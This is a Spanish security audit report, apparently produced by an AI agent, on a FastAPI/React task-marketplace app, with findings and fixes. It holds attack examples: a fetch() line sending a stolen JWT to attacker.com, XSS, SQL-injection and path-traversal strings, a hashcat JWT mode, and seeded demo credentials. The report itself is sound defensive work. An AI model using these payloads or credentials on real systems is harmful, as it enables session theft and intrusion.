# Informe de Auditoría de Seguridad — Co-Computing
**Fecha:** 2026-06-06  
**Auditor:** Security Agent  
**Versión de código auditada:** commit `868a09d` (rama `main`)  
**Alcance:** Backend FastAPI, Frontend React, Migraciones SQL, Configuración

---

## Resumen Ejecutivo

| Severidad | Cantidad |
|-----------|----------|
| CRÍTICO   | 3        |
| ALTO      | 5        |
| MEDIO     | 6        |
| BAJO      | 4        |
| **Total** | **18**   |

**Risk Score Global: ALTO**

Los hallazgos críticos son accionables antes del despliegue y ninguno requiere rediseño arquitectónico mayor. El riesgo más grave es la race condition en retiros de fondos (doble gasto real), seguido del almacenamiento del JWT en `localStorage` (superficie XSS) y la ausencia total de rate limiting en los endpoints de autenticación (fuerza bruta desprotegida). Los hallazgos de severidad alta deben resolverse antes de go-live; los de severidad media y baja son mejoras post-lanzamiento pero deben planificarse.

**Hallazgos validados del Code Reviewer anterior:**

| # | Hallazgo del Reviewer | Estado tras auditoría |
|---|----------------------|-----------------------|
| 1 | JWT en localStorage — superficie XSS | CONFIRMADO (ALTO) |
| 2 | Sin rate limiting en /auth/login y /auth/register | CONFIRMADO (CRÍTICO) |
| 3 | Race condition en retiros de fondos | CONFIRMADO (CRÍTICO) |
| 4 | Path params sin validación UUID | CONFIRMADO (MEDIO) |
| 5 | RLS: verificar validación provider_id del JWT | CONFIRMADO — protección correcta en código, pero RLS de BD es un bypass total (ALTO) |
| 6 | Cuenta demo en seed en producción | CONFIRMADO (ALTO) |
| 7 | supabase_service_role_key sin logging en CI/CD | NO APLICABLE — no existe pipeline CI/CD en el repositorio |

---

## CRÍTICO

---

### SEC-01 — Race Condition / TOCTOU en Retiro de Fondos (Doble Gasto)

**CWE:** CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)  
**Archivos:**
- `backend/app/services/wallet_service.py` líneas 62-78
- `backend/app/db/queries/wallet_queries.py` líneas 113-139

**Descripción técnica:**

El proceso de retiro de fondos ejecuta un patrón read-then-write no atómico con dos llamadas independientes a la base de datos sin transacción ni bloqueo:

1. `wallet_service.py:62` — `GET wallet` (lee `available_balance`)
2. `wallet_service.py:69-75` — validación del saldo en Python
3. `wallet_service.py:78` — `UPDATE wallet` (descuenta el saldo)

Entre los pasos 1 y 3, el saldo leído puede haber cambiado en la base de datos por una solicitud concurrente. El patrón es idéntico en `update_wallet_on_task_complete` (`wallet_queries.py:92-110`) y `update_wallet_on_withdraw` (`wallet_queries.py:121-138`): ambas funciones leen el valor actual en Python, calculan el nuevo valor en Python y luego lo escriben con un `UPDATE ... WHERE provider_id = ?` sin condición de versión ni bloqueo optimista.

**Escenario de ataque:**

Un usuario malintencionado envía dos peticiones `POST /wallet/withdraw` simultáneas por un importe igual a su saldo total:

```
T0: Request A lee available_balance = 50.00
T0: Request B lee available_balance = 50.00  (misma lectura concurrente)
T1: Request A valida 50 <= 50  OK
T1: Request B valida 50 <= 50  OK
T2: Request A escribe available_balance = 0.00
T2: Request B escribe available_balance = 0.00  (basa su UPDATE en 50.00 leído en T0)
```

Resultado: se retiran 100 CC cuando solo existían 50 CC. El constraint `CHECK (available_balance >= 0.00)` de la BD debería atrapar esto, pero la escritura del paso T2 de B calcula `50.00 - 50.00 = 0.00`, que es válido, por lo que el constraint no lo previene.

**Impacto:** Pérdida económica directa. Extracción de fondos superiores al saldo real. Inconsistencia permanente entre `available_balance`, `total_earned` y `total_withdrawn`.

**Mitigación concreta:**

Reemplazar el read-modify-write en Python por una operación atómica en SQL con `UPDATE ... WHERE available_balance >= amount RETURNING available_balance`. Si `rowcount == 0`, el saldo era insuficiente.

```python
# wallet_queries.py — reemplazo de update_wallet_on_withdraw
def update_wallet_on_withdraw(provider_id: str, amount: float) -> dict[str, Any]:
    sql = """
        UPDATE wallets
        SET available_balance  = available_balance - %s,
            total_withdrawn    = total_withdrawn + %s,
            updated_at         = now()
        WHERE provider_id = %s
          AND available_balance >= %s
        RETURNING *
    """
    with psycopg2.connect(settings.supabase_db_url,
                          cursor_factory=psycopg2.extras.RealDictCursor) as conn:
        with conn.cursor() as cur:
            cur.execute(sql, (amount, amount, provider_id, amount))
            row = cur.fetchone()
            conn.commit()
    if row is None:
        raise ValueError("Saldo insuficiente o cartera no encontrada")
    return dict(row)
```

La validación de saldo mínimo en `wallet_service.py` puede eliminarse (pasa a ser responsabilidad exclusiva del UPDATE atómico) o mantenerse como verificación optimista previa para mejorar la UX del error.

---

### SEC-02 — Sin Rate Limiting en Endpoints de Autenticación

**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
**Archivos:**
- `backend/app/routers/auth.py` líneas 19-80
- `backend/app/main.py` (sin middleware de limitación)
- `backend/requirements.txt` (sin `slowapi` ni equivalente)

**Descripción técnica:**

Los endpoints `POST /auth/login` y `POST /auth/register` no tienen ninguna restricción de tasa de peticiones. No existe middleware de rate limiting en la aplicación (verificado en `main.py` y `requirements.txt`). Un atacante puede enviar millones de peticiones de login sin ser bloqueado.

**Escenario de ataque:**

1. Ataque de credential stuffing: el atacante tiene una lista de pares email/password de filtraciones públicas. Lanza peticiones en paralelo hasta obtener un 200.
2. Ataque de fuerza bruta dirigida: conoce el email de un usuario (obtenible por timing en `/auth/register` que devuelve 409 si el email existe) y prueba contraseñas en bucle.
3. Abuso de `/auth/register` para crear miles de cuentas y saturar la base de datos.

**Impacto:** Compromiso de cuentas de usuarios reales. Saturación de recursos (CPU de bcrypt es costosa por diseño). Denegación de servicio efectiva.

**Mitigación concreta:**

Añadir `slowapi` (integración oficial de rate limiting para FastAPI):

```bash
pip install slowapi
```

```python
# main.py
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)
```

```python
# routers/auth.py
from slowapi import Limiter
from slowapi.util import get_remote_address

limiter = Limiter(key_func=get_remote_address)

@router.post("/login", response_model=TokenResponse)
@limiter.limit("10/minute")
def login(request: Request, payload: LoginRequest) -> TokenResponse:
    ...

@router.post("/register", response_model=ProviderPublic, status_code=201)
@limiter.limit("5/minute")
def register(request: Request, payload: RegisterRequest) -> ProviderPublic:
    ...
```

Además, implementar backoff exponencial o bloqueo temporal por IP tras N intentos fallidos consecutivos (puede hacerse con Redis si está disponible).

---

### SEC-03 — Secreto JWT Débil o Predecible en Ausencia de Validación de Entropía

**CWE:** CWE-521 (Weak Password Requirements) aplicado a secretos criptográficos  
**Archivos:**
- `backend/app/core/config.py` líneas 13-14
- `backend/.env.example` línea 13

**Descripción técnica:**

El campo `jwt_secret_key` se acepta como cualquier `str` sin ninguna validación de longitud mínima ni entropía en el modelo `Settings`. Si un operador de despliegue configura una clave débil (por ejemplo `"secret"`, `"changeme"`, o copia literalmente el placeholder `"<mínimo_32_chars_aleatorios>"`), todos los JWT emitidos quedan expuestos a ataques de fuerza bruta offline contra el algoritmo HS256.

El algoritmo HS256 firma con HMAC-SHA256. Un atacante que capture un JWT válido puede atacar la clave offline sin límite de velocidad. Con claves cortas (<32 caracteres) o de baja entropía, el coste computacional es manejable con hardware moderno.

**Escenario de ataque:**

1. El atacante captura un JWT de tráfico (Man-in-the-Middle sin HTTPS, o desde `localStorage` vía XSS).
2. Ejecuta `hashcat` u `oclHashcat` en modo JWT (`--hash-type 16500`) contra diccionarios o fuerza bruta de longitud corta.
3. Con la clave, puede forjar tokens con cualquier `sub` (cualquier `provider_id`), esencialmente tomando control de cualquier cuenta.

**Impacto:** Compromiso total de todas las cuentas de la plataforma. Un único secreto débil rompe toda la autenticación.

**Mitigación concreta:**

Añadir validador en `Settings`:

```python
# config.py
from pydantic import field_validator

class Settings(BaseSettings):
    jwt_secret_key: str
    ...

    @field_validator("jwt_secret_key")
    @classmethod
    def validate_jwt_secret(cls, v: str) -> str:
        if len(v) < 32:
            raise ValueError(
                "JWT_SECRET_KEY must be at least 32 characters. "
                "Generate with: openssl rand -hex 32"
            )
        return v
```

Documentar en el README y en el proceso de despliegue que la clave debe generarse con `openssl rand -hex 32` (64 caracteres hexadecimales = 256 bits de entropía).

---

## ALTO

---

### SEC-04 — JWT Almacenado en localStorage — Superficie XSS Amplia

**CWE:** CWE-922 (Insecure Storage of Sensitive Information), CWE-79 (XSS)  
**Archivos:**
- `frontend/src/store/authStore.ts` líneas 13-37
- `frontend/src/api/client.ts` líneas 14-22

**Descripción técnica:**

El JWT de acceso se almacena en `localStorage` bajo la clave `co_computing_token`. `localStorage` es accesible por cualquier JavaScript ejecutado en el origen, incluyendo código inyectado por XSS. El interceptor axios en `client.ts` lee el token directamente de `localStorage` en cada petición.

El objeto completo del provider también se serializa en `localStorage` bajo `co_computing_provider`, exponiéndose: email, nombre completo, trust_score, hardware (CPU, GPU, RAM, almacenamiento), estado online, total ganado y datos de rank.

**Escenario de ataque:**

Si cualquier dependencia npm (directa o transitiva) tiene una vulnerabilidad XSS, o si se introduce un vector de XSS en el propio código (por ejemplo, renderizado de contenido no sanitizado procedente de la API), el atacante puede ejecutar:

```javascript
fetch('https://attacker.com/steal?t=' + localStorage.getItem('co_computing_token'))
```

Con el token en su poder (válido por 7 días), tiene acceso completo a la cuenta hasta la expiración.

**Impacto:** Robo de sesión completo. El usuario no puede invalidar el token robado (no hay mecanismo de revocación).

**Mitigación concreta:**

Migrar el token a una cookie `HttpOnly; Secure; SameSite=Strict`. El backend debe leer el token desde la cookie:

```python
# Backend: login devuelve cookie HttpOnly en vez de JSON con token
from fastapi import Response

@router.post("/login")
def login(payload: LoginRequest, response: Response) -> ProviderPublic:
    ...
    response.set_cookie(
        key="access_token",
        value=token,
        httponly=True,
        secure=True,          # Solo HTTPS
        samesite="strict",
        max_age=settings.jwt_expire_seconds,
    )
    return ProviderPublic(**provider)
```

```python
# Backend: leer token desde cookie
from fastapi import Cookie

async def get_current_provider(access_token: str | None = Cookie(default=None)) -> dict:
    if access_token is None:
        raise unauthorized
    ...
```

```typescript
// Frontend: eliminar toda escritura en localStorage del token
// apiClient no necesita interceptor de token; la cookie se envía automáticamente
// con withCredentials: true
export const apiClient = axios.create({
  baseURL: BASE_URL,
  withCredentials: true,  // envía cookies en cross-origin
  headers: { 'Content-Type': 'application/json' },
  timeout: 15000,
})
```

El CORS ya tiene `allow_credentials=True` en `main.py`, lo que facilita esta migración.

---

### SEC-05 — RLS de Base de Datos Completamente Bypaseada — Sin Defensa en Profundidad

**CWE:** CWE-284 (Improper Access Control)  
**Archivos:**
- `migrations/002_rls.sql` líneas 8-21 (comentario inicial)
- `backend/app/db/client.py` líneas 14-15
- `backend/app/db/rls_policies.sql` líneas 10-13 (`USING (true)`)

**Descripción técnica:**

El backend accede a Supabase exclusivamente con la `service_role key`, que bypasea todas las políticas RLS. Esto significa que si hay un bug de autorización en cualquier endpoint de FastAPI (IDOR, lógica incorrecta de provider_id), la base de datos no tiene ninguna salvaguarda adicional.

Adicionalmente, `rls_policies.sql` define políticas con `USING (true)` para `providers` y `tasks` (lectura pública sin restricción) y `WITH CHECK (true)` para inserciones en `tasks` y `transactions`, lo que en combinación con la `service_role` supone que cualquier error de lógica en el backend resulta en acceso/escritura no restringido.

La migración `002_rls.sql` documenta explícitamente que las políticas de usuario con `auth.uid()` "no tienen efecto" en el MVP actual porque el backend nunca pasa por Supabase Auth.

**Escenario de ataque:**

Si un endpoint introduce un IDOR (por ejemplo, `GET /wallet/?provider_id=<victim_id>` en un endpoint hipotético futuro), la BD no bloquea la consulta. El backend es el único punto de control.

**Impacto:** La capa de datos no ofrece defensa en profundidad. Un bug de lógica en cualquier servicio expone datos de todos los usuarios.

**Mitigación:**

1. En el corto plazo: documentar formalmente que toda autorización recae en la capa FastAPI y establecer tests de autorización que verifican que provider A no puede acceder a datos de provider B.
2. En el medio plazo: evaluar migrar a Supabase Auth o implementar un mecanismo que pase el `provider_id` del JWT propio a `SET LOCAL app.current_provider_id = ?` en cada conexión psycopg2, y usar `current_setting('app.current_provider_id')` en las políticas RLS en lugar de `auth.uid()`.
3. Eliminar o restringir las políticas `USING (true)` del archivo `rls_policies.sql` — especialmente `providers_select_own` que actualmente permite SELECT sin restricción.

---

### SEC-06 — Cuenta Demo con Credenciales Conocidas en Migración de Producción

**CWE:** CWE-798 (Use of Hard-coded Credentials)  
**Archivo:** `migrations/003_seed.sql` líneas 7-17, 26-74

**Descripción técnica:**

El archivo `003_seed.sql` (denominado "Seed de producción" en su propio encabezado) inserta un proveedor con:
- Email: `demo@co-computing.io`
- Password: `demo1234` (hash bcrypt hardcodeado: `$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/lewdBpj8GFg0JkDK2`)
- UUID fijo: `11111111-1111-1111-1111-111111111111`
- Saldo disponible: `18.50 CC`
- Rank: `experto` (trust_score 82.30)

La contraseña `demo1234` es trivialmente adivinable y el hash está expuesto públicamente en el repositorio. Cualquier persona con acceso al código puede autenticarse como la cuenta demo en producción.

El UUID fijo `11111111-1111-1111-1111-111111111111` también permite ataques dirigidos a ese ID específico desde cualquier potencial IDOR.

**Escenario de ataque:**

Un atacante encuentra el repositorio (presente en GitHub según el git status), lee las credenciales del seed, y hace login en `POST /auth/login` con `demo@co-computing.io` / `demo1234`. Obtiene un JWT válido con acceso completo a la cuenta demo, incluyendo la posibilidad de solicitar retiros del saldo existente.

**Impacto:** Acceso no autorizado a una cuenta con fondos reales en producción. Dado que el UUID es predecible, también facilita reconocimiento de la plataforma.

**Mitigación concreta:**

1. Separar en dos archivos distintos: `003_seed_tasks.sql` (solo tareas, seguro para producción) y `003_seed_demo.sql` (cuenta demo, solo para desarrollo/staging).
2. En el proceso de despliegue de producción, ejecutar únicamente `001_schema.sql`, `002_rls.sql` y `003_seed_tasks.sql`.
3. Si la cuenta demo debe existir temporalmente en producción, generar la contraseña con `openssl rand -base64 32` y **no** incluirla en el repositorio. Entregar la contraseña por canal seguro.
4. Añadir un check en el script de deploy:

```bash
if [ "$ENVIRONMENT" = "production" ]; then
  echo "ADVERTENCIA: No ejecutar 003_seed.sql en producción"
  exit 1
fi
```

---

### SEC-07 — Expiración de JWT de 7 Días Sin Mecanismo de Revocación

**CWE:** CWE-613 (Insufficient Session Expiration)  
**Archivos:**
- `backend/app/core/config.py` línea 14 (`jwt_expire_days: int = 7`)
- `backend/app/core/security.py` líneas 48-64

**Descripción técnica:**

Los tokens JWT tienen una validez de 7 días. No existe ningún mecanismo de revocación (lista negra, rotación de tokens, ni almacenamiento de tokens activos en BD). Si un token es robado (vía XSS desde `localStorage`, MITM, o compromiso de dispositivo), el atacante tiene acceso garantizado por hasta 7 días sin posibilidad de corte.

El endpoint `GET /auth/me` verifica que el `provider_id` del token exista en BD, pero no verifica si el token ha sido explícitamente revocado. Un usuario que cambie su contraseña, cierre sesión en todos los dispositivos, o reporte robo de cuenta no tiene forma de invalidar los tokens existentes.

**Impacto:** Ventana de compromiso prolongada tras robo de token. Imposibilidad de respuesta a incidentes efectiva.

**Mitigación:**

1. Reducir la expiración a 15-60 minutos para el access token e implementar un refresh token de vida más larga almacenado en cookie HttpOnly (complementa SEC-04).
2. Alternativamente, mantener una tabla `revoked_tokens` en BD con el JTI (JWT ID) y verificarla en el middleware de autenticación. Añadir claim `jti` en `create_access_token`.
3. Añadir un endpoint `POST /auth/logout` que invalide el token actual.

---

### SEC-08 — Exposición de password_hash en Consultas SELECT * a providers

**CWE:** CWE-200 (Exposure of Sensitive Information), CWE-359 (Exposure of Private Information)  
**Archivos:**
- `backend/app/db/queries/auth_queries.py` líneas 14, 29
- `backend/app/db/queries/profile_queries.py` línea 13

**Descripción técnica:**

Todas las consultas a la tabla `providers` usan `SELECT *`, recuperando el campo `password_hash` en cada llamada. El hash bcrypt viaja desde la BD hasta la capa de servicio en cada petición autenticada (incluyendo `GET /auth/me`, `GET /profile/stats`, y cualquier comprobación de `get_current_provider`).

Si bien los modelos Pydantic (`ProviderPublic`, `ProviderMe`) excluyen `password_hash` de la serialización JSON, el hash reside en memoria del proceso Python y en los resultados de las consultas. Un bug futuro en la serialización, logging de objetos, o un error de configuración podría exponer el hash.

**Escenario de ataque:**

Un desarrollador añade logging de debug que serializa el dict completo del provider. El `password_hash` aparece en los logs, que se almacenan en un SIEM o sistema de logs accesible por más personas. Con el hash, un atacante puede intentar crackeo offline.

**Impacto:** Exposición del hash de contraseña facilita ataques de crackeo offline.

**Mitigación concreta:**

Reemplazar `SELECT *` por columnas explícitas, excluyendo `password_hash` excepto en la consulta de login:

```python
# auth_queries.py — solo get_provider_by_email necesita password_hash
PROVIDER_PUBLIC_COLUMNS = (
    "id, email, full_name, trust_score, rank, tasks_completed, "
    "success_rate, total_earned, completion_rate, accuracy, "
    "response_time_score, client_rating, cpu_model, gpu_model, "
    "ram_gb, storage_gb, is_online, created_at, updated_at"
)

def get_provider_by_id(provider_id: str) -> dict | None:
    response = (
        get_supabase().table("providers")
        .select(PROVIDER_PUBLIC_COLUMNS)
        .eq("id", provider_id)
        .limit(1)
        .execute()
    )
    ...

def get_provider_by_email(email: str) -> dict | None:
    # Esta sí necesita password_hash para verificación
    response = (
        get_supabase().table("providers")
        .select(PROVIDER_PUBLIC_COLUMNS + ", password_hash")
        .eq("email", email)
        ...
    )
```

---

## MEDIO

---

### SEC-09 — Path Parameters sin Validación de Formato UUID

**CWE:** CWE-20 (Improper Input Validation)  
**Archivos:**
- `backend/app/routers/tasks.py` líneas 111, 188, 220, 246, 261, 276

**Descripción técnica:**

Los path parameters `task_id` y `assignment_id` se declaran como `str` sin validación de formato UUID. FastAPI aceptará cualquier cadena arbitraria, que se pasa directamente a las consultas de la BD.

```python
# tasks.py línea 111 — assignment_id sin validación
def get_assignment_progress(assignment_id: str, ...) -> ProgressResponse:

# tasks.py línea 188 — task_id sin validación
def get_task(task_id: str, ...) -> TaskResponse:
```

**Escenario de ataque:**

Un atacante envía `GET /tasks/../../etc/passwd` o `GET /tasks/'; DROP TABLE tasks; --`. Aunque el Supabase SDK usa consultas parametrizadas que previenen SQL injection, una cadena maliciosa podría:
- Generar errores inesperados que filtren stack traces (mitigado por el handler genérico, pero no garantizado en todos los casos).
- Causar comportamiento inesperado en joins psycopg2 si los parámetros se interpolan incorrectamente en el futuro.
- Path traversal en logs.

**Mitigación concreta:**

Usar el tipo `UUID` de Python con Pydantic/FastAPI:

```python
from uuid import UUID

@router.get("/{task_id}", response_model=TaskResponse)
def get_task(task_id: UUID, current_provider: dict = Depends(get_current_provider)) -> TaskResponse:
    task = task_queries.get_task_by_id(str(task_id))  # convertir a str para la query
    ...
```

FastAPI validará automáticamente el formato UUID y devolverá 422 si el formato no es válido, sin llegar a la base de datos.

---

### SEC-10 — Cabeceras de Seguridad HTTP Incompletas

**CWE:** CWE-16 (Configuration)  
**Archivo:** `backend/app/main.py` líneas 59-65

**Descripción técnica:**

El middleware de seguridad añade únicamente `X-Content-Type-Options: nosniff` y `X-Frame-Options: DENY`. Faltan cabeceras críticas:

- `Content-Security-Policy` (CSP): no existe. Sin CSP, XSS puede ejecutar scripts arbitrarios.
- `Strict-Transport-Security` (HSTS): no existe. Sin HSTS, las conexiones pueden ser degradadas a HTTP.
- `Referrer-Policy`: no existe. Las URLs referrer pueden filtrar rutas internas.
- `Permissions-Policy`: no existe. No se restringe acceso a APIs del navegador (cámara, micrófono, geolocalización).
- `Cache-Control`: no existe para endpoints que devuelven datos sensibles (wallet, perfil).

**Mitigación concreta:**

```python
@app.middleware("http")
async def add_security_headers(request: Request, call_next) -> Response:
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains; preload"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "  # ajustar si se usa Tailwind con inline styles
        "img-src 'self' data:; "
        "connect-src 'self'"
    )
    # No cachear datos sensibles
    if request.url.path.startswith(("/wallet", "/profile", "/auth/me")):
        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate"
    return response
```

---

### SEC-11 — Ausencia de Transacción Atómica en Completar/Fallar Tarea

**CWE:** CWE-362 (Race Condition)  
**Archivo:** `backend/app/services/task_lifecycle.py` líneas 102-220

**Descripción técnica:**

La función `complete_task` realiza múltiples operaciones en la base de datos de forma secuencial y sin transacción:

1. `update_assignment_status` (Supabase SDK)
2. `update_wallet_on_task_complete` (Supabase SDK)
3. `create_transaction` (Supabase SDK)
4. `get_provider_by_id` (Supabase SDK)
5. `update_provider` (Supabase SDK)
6. `update_assignment_status` de nuevo para trust_delta (Supabase SDK)

Si cualquier operación falla entre el paso 1 y el paso 6, la base de datos queda en un estado inconsistente: por ejemplo, la wallet puede actualizarse pero la transacción no crearse, o el trust_score no actualizarse aunque la tarea figure como completada.

**Impacto:** Inconsistencia de datos en caso de fallo parcial. Pérdida o duplicación de recompensas en escenarios de retry o fallo de red.

**Mitigación:**

Envolver todas las operaciones de `complete_task` y `fail_task` en una transacción psycopg2 única. Dado que el Supabase Python SDK no soporta transacciones multi-statement, migrar estas operaciones de escritura complejas a psycopg2 con `BEGIN/COMMIT` explícito, o a una stored procedure PostgreSQL que ejecute todo de forma atómica.

---

### SEC-12 — Validación de Destino de Retiro Sin Formato

**CWE:** CWE-20 (Improper Input Validation)  
**Archivos:**
- `backend/app/models/wallet.py` líneas 39-40
- `frontend/src/pages/WalletPage.tsx` líneas 92-114

**Descripción técnica:**

El campo `destination` en `WithdrawRequest` solo valida `min_length=1, max_length=200`. No se valida el formato según el método de pago:
- Para `paypal`: no se valida que sea un email válido.
- Para `transferencia`: no se valida formato IBAN.
- Para `cripto`: no se valida formato de dirección de wallet.

El frontend hace validación visual pero no de formato. Un atacante puede enviar directamente a la API un payload como `{"amount": 10, "method": "paypal", "destination": "<script>alert(1)</script>"}`. El `withdraw_destination` se almacena en la BD y se muestra posteriormente en el historial de transacciones del frontend (`WalletPage.tsx:325-328`), creando un vector de XSS almacenado si el componente renderiza el valor sin escapar (React escapa por defecto, pero es una superficie de riesgo).

**Mitigación concreta:**

```python
# models/wallet.py
from pydantic import field_validator
import re

class WithdrawRequest(BaseModel):
    amount: float = Field(..., gt=0)
    method: Literal["transferencia", "paypal", "cripto"]
    destination: str = Field(..., min_length=1, max_length=200)

    @field_validator("destination")
    @classmethod
    def validate_destination_format(cls, v: str, info) -> str:
        method = info.data.get("method")
        if method == "paypal":
            # Validar formato email
            if not re.match(r'^[^\s@]+@[^\s@]+\.[^\s@]+$', v):
                raise ValueError("El destino PayPal debe ser un email válido")
        # Añadir validaciones para IBAN y cripto según necesidad
        return v.strip()
```

---

### SEC-13 — Creación de Conexiones psycopg2 Sin Pool (Una Conexión por Petición)

**CWE:** CWE-400 (Uncontrolled Resource Consumption)  
**Archivo:** `backend/app/db/queries/task_queries.py` líneas 85, 159, 238

**Descripción técnica:**

Las tres funciones que usan psycopg2 directamente (`decrement_slots_atomic`, `get_provider_assignments_history`, `get_assignment_with_task`) abren una nueva conexión TCP a la base de datos por cada invocación:

```python
with psycopg2.connect(settings.supabase_db_url, ...) as conn:
```

En entornos de alto tráfico, esto satura el número de conexiones disponibles en Supabase (limitado según el plan) y añade latencia de handshake TCP+TLS en cada petición.

**Impacto:** Denegación de servicio efectiva bajo carga moderada. Posible agotamiento del pool de conexiones de Supabase.

**Mitigación:**

Implementar un pool de conexiones con `psycopg2.pool.ThreadedConnectionPool` o migrar a `asyncpg` con pool async. Alternativamente, usar el connection pooler de Supabase (puerto 6543, ya configurado en `SUPABASE_DB_URL` según el `.env.example`) asegurando que se use `connect_timeout` y `pool_max` adecuados.

---

### SEC-14 — Health Check Expone Entorno en Producción

**CWE:** CWE-200 (Information Exposure)  
**Archivo:** `backend/app/main.py` líneas 97-100

**Descripción técnica:**

```python
@app.get("/health", tags=["health"], include_in_schema=not settings.is_production)
def health_check() -> dict:
    return {"status": "ok", "environment": settings.environment}
```

El endpoint `/health` está accesible en producción (no hay autenticación ni restricción de IP) y devuelve el valor de `settings.environment`. Si bien este valor es bajo impacto, el endpoint también confirma que la aplicación está activa y puede usarse para reconocimiento automatizado.

**Mitigación:**

Eliminar el campo `environment` de la respuesta en producción:

```python
@app.get("/health")
def health_check() -> dict:
    if settings.is_production:
        return {"status": "ok"}
    return {"status": "ok", "environment": settings.environment}
```

Considerar proteger el endpoint con una cabecera de API key interna para monitorización.

---

## BAJO

---

### SEC-15 — python-jose con Versión Potencialmente Vulnerable

**CWE:** CWE-1395 (Use of Vulnerable Third-Party Component)  
**Archivo:** `backend/requirements.txt` línea 5 (`python-jose[cryptography]==3.3.0`)

**Descripción técnica:**

`python-jose 3.3.0` tiene vulnerabilidades conocidas. La librería ha tenido problemas históricos con el manejo de algoritmos (incluyendo el ataque de confusión de algoritmos donde `alg=none` podría aceptarse en versiones anteriores). La implementación actual en `security.py` especifica explícitamente `algorithms=[settings.jwt_algorithm]` en el decode, lo que mitiga el ataque `alg=none`, pero la librería en sí no se mantiene activamente.

**Mitigación:**

Migrar a `PyJWT` (mantenida activamente por el equipo de PyPI) o `authlib`:

```bash
pip install PyJWT[crypto]>=2.8.0
```

```python
import jwt  # PyJWT

def create_access_token(subject: str, ...) -> str:
    payload = {"sub": subject, "iat": now, "exp": expire}
    return jwt.encode(payload, settings.jwt_secret_key, algorithm=settings.jwt_algorithm)

def verify_token(token: str) -> str | None:
    try:
        payload = jwt.decode(token, settings.jwt_secret_key, algorithms=[settings.jwt_algorithm])
        return payload.get("sub")
    except jwt.PyJWTError:
        return None
```

---

### SEC-16 — Logs Sin Sanitización — Posible Log Injection

**CWE:** CWE-117 (Improper Output Neutralization for Logs)  
**Archivo:** `backend/app/main.py` línea 75

**Descripción técnica:**

```python
logger.exception("Unhandled exception: %s", exc)
```

Si la excepción `exc` contiene caracteres de control o newlines procedentes de input de usuario (por ejemplo, en el mensaje de una excepción de validación), se podría inyectar entradas falsas en el log. En escenarios donde los logs se procesan por un SIEM, esto puede causar alertas falsas o enmascarar actividad maliciosa.

**Mitigación:**

```python
safe_msg = str(exc).replace('\n', ' ').replace('\r', ' ')
logger.exception("Unhandled exception: %s", safe_msg)
```

---

### SEC-17 — Ausencia de Política de Contraseñas Robusta

**CWE:** CWE-521 (Weak Password Requirements)  
**Archivos:**
- `backend/app/models/auth.py` líneas 8-13
- `frontend/src/pages/RegisterPage.tsx` línea 37

**Descripción técnica:**

El único requisito de contraseña es longitud mínima de 8 caracteres. No se verifica:
- Presencia de caracteres de distintas categorías (mayúsculas, minúsculas, dígitos, símbolos).
- Que la contraseña no sea una de las más comunes (`password`, `12345678`, etc.).
- Que la contraseña no contenga el email del usuario.

**Mitigación:**

Añadir validación en el modelo Pydantic y actualizar el frontend para mostrar indicador de fortaleza:

```python
@field_validator("password")
@classmethod
def password_strength(cls, v: str) -> str:
    if len(v) < 8:
        raise ValueError("Mínimo 8 caracteres")
    if not any(c.isupper() for c in v):
        raise ValueError("Debe contener al menos una mayúscula")
    if not any(c.isdigit() for c in v):
        raise ValueError("Debe contener al menos un número")
    return v
```

---

### SEC-18 — Ausencia de Cabecera Vary en Respuestas CORS

**CWE:** CWE-346 (Origin Validation Error)  
**Archivo:** `backend/app/main.py` líneas 46-52

**Descripción técnica:**

El middleware CORS de FastAPI añade `Access-Control-Allow-Origin` pero no garantiza la cabecera `Vary: Origin` en todas las respuestas en presencia de proxies intermedios. Sin `Vary: Origin`, un proxy de caché puede servir una respuesta con `Access-Control-Allow-Origin: https://app.co-computing.io` a una petición desde un origen diferente, potencialmente relajando las restricciones CORS.

**Mitigación:**

Verificar que `starlette.middleware.cors.CORSMiddleware` (usado por FastAPI) añade `Vary: Origin` correctamente. En la versión actual de Starlette esto está implementado, pero debe verificarse en el entorno de producción con proxy reverso (nginx/Cloudflare). Añadir prueba de integración que verifique la cabecera `Vary` en las respuestas preflight.

---

## Checklist de Despliegue Seguro

### Secretos y Configuración

- [ ] `JWT_SECRET_KEY` generado con `openssl rand -hex 32` (mínimo 32 chars, alta entropía)
- [ ] `SUPABASE_SERVICE_ROLE_KEY` configurada SOLO como variable de entorno del servidor, nunca en el repositorio ni en archivos de configuración trackeados por git
- [ ] `FRONTEND_URL` apunta exclusivamente al dominio de producción (sin wildcard, sin trailing slash)
- [ ] `ENVIRONMENT=production` configurado en el servidor de producción
- [ ] Archivo `.env` incluido en `.gitignore` (ya está, verificar que no exista ningún `.env` real en el repositorio)
- [ ] Rotar el `JWT_SECRET_KEY` si se sospecha que ha sido comprometido (invalida todos los tokens existentes)
- [ ] Verificar que `SUPABASE_SERVICE_ROLE_KEY` no aparece en ningún log de CI/CD

### Base de Datos

- [ ] Ejecutar SOLO `001_schema.sql` + `002_rls.sql` + seed de tareas en producción
- [ ] NO ejecutar `003_seed.sql` (cuenta demo) en producción
- [ ] Verificar con `SELECT tablename, rowsecurity FROM pg_tables WHERE schemaname='public'` que RLS está activo en las 5 tablas
- [ ] Confirmar que la `service_role key` es la única credencial con acceso al backend y que no hay credenciales de `anon` role expuestas

### Backend

- [ ] Instalar e integrar `slowapi` para rate limiting antes de despliegue
- [ ] Implementar la operación atómica de retiro (SEC-01) antes de despliegue
- [ ] Actualizar `python-jose` a `PyJWT>=2.8.0` (SEC-15)
- [ ] Verificar que `/docs`, `/redoc` y `/openapi.json` devuelven 404 en producción
- [ ] Asegurar que el servidor corre detrás de HTTPS (TLS 1.2+). `HSTS` en el middleware solo tiene efecto si hay TLS en el transporte
